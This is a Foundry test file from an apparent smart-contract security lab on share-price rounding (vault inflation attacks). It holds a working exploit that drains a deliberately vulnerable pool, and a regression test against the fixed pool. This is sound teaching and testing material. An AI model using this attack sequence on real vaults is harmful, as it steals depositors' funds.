// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerablePool} from "../src/VulnerablePool.sol";
import {SafePool} from "../src/SafePool.sol";

/// @title Precision.t.sol
/// @notice Lab 05 — Exploit + regression test for share-price rounding.
///
/// Lab: Integer precision loss (EIP-4626-style inflation attack)
///
/// Threat model:
///   The pool mints shares as `assets * totalShares / totalAssets` with
///   floor division. The first depositor can own ~100% of `totalShares`
///   and inflate `totalAssets` with an external donation. The next
///   depositor's share math truncates to zero — but the deposit is
///   accepted anyway, so the depositor's funds belong to the pool forever.
///
/// Violated invariant:
///   "A depositor's shares never round below the value they deposited."
///   Floor rounding breaks the invariant once the price per share is
///   inflated beyond the depositor's deposit size.
///
/// Reproduction:
///   1. Attacker deposits 1 wei and receives 1 share (100% of supply).
///   2. Attacker donates 10 ETH — `totalAssets` inflates, `totalShares` stays 1.
///   3. Victim deposits 5 ETH: `(5e18 * 1) / (1e19 + 1)` floors to 0 shares.
///      The deposit is still accepted.
///   4. Attacker redeems their single share for the entire pool balance —
///      victim's 5 ETH is stolen.
///
/// Remediation:
///   The first deposit mints DEAD_SHARES to address(0). To zero out a
///   victim's mint the attacker must donate ~DEAD_SHARES times the
///   victim's deposit, and the donation itself is unrecoverable — the
///   attack becomes a guaranteed net loss (see SafePool).
///
/// Regression test:
///   The same attack against SafePool leaves the victim with shares and
///   lets them withdraw at least their deposit, while the attacker exits
///   with far less than they contributed.
contract PrecisionTest is Test {
    VulnerablePool internal vulnerable;
    SafePool internal safe;

    uint256 internal constant DONATION = 10 ether;
    uint256 internal constant VICTIM_DEPOSIT = 5 ether;

    function setUp() public {
        vulnerable = new VulnerablePool();
        safe = new SafePool();
    }

    receive() external payable {}

    function testVulnerablePoolInflationStealsDeposit() public {
        deal(address(this), DONATION + 1);

        // Steps 1-2: sole shareholder + inflated pool price.
        vulnerable.deposit{value: 1}();
        vulnerable.donate{value: DONATION}();

        // Step 3: victim deposits and mints zero shares.
        address victim = makeAddr("victim");
        deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        vulnerable.deposit{value: VICTIM_DEPOSIT}();
        assertEq(vulnerable.shares(victim), 0, "victim must mint 0 shares");

        // Step 4: attacker redeems one share for the entire pool.
        vulnerable.withdraw(vulnerable.shares(address(this)));

        assertEq(address(vulnerable).balance, 0, "vault should be drained");
        assertGt(address(this).balance, 15 ether, "attacker stole the deposit");
        assertEq(victim.balance, 0, "victim lost everything");
    }

    function testSafePoolResistsInflation() public {
        deal(address(this), DONATION + 1);

        // Same attack sequence against the remediated pool.
        safe.deposit{value: 1}();
        safe.donate{value: DONATION}();

        address victim = makeAddr("victim");
        deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        safe.deposit{value: VICTIM_DEPOSIT}();

        // The victim mints real shares backed by the pool.
        assertGt(safe.shares(victim), 0, "victim must mint shares");

        // The attacker cannot recover the donation — the attack is a net loss.
        safe.withdraw(safe.shares(address(this)));
        assertLt(address(this).balance, DONATION + 1, "inflation must be unprofitable");

        // The victim recovers their deposit minus only rounding dust and
        // the dust the attacker extracted (about 0.0001% here).
        uint256 victimShares = safe.shares(victim);
        vm.prank(victim);
        uint256 redeemed = safe.withdraw(victimShares);
        assertGe(redeemed, VICTIM_DEPOSIT - VICTIM_DEPOSIT / 1000, "victim must recover their deposit");
    }
}
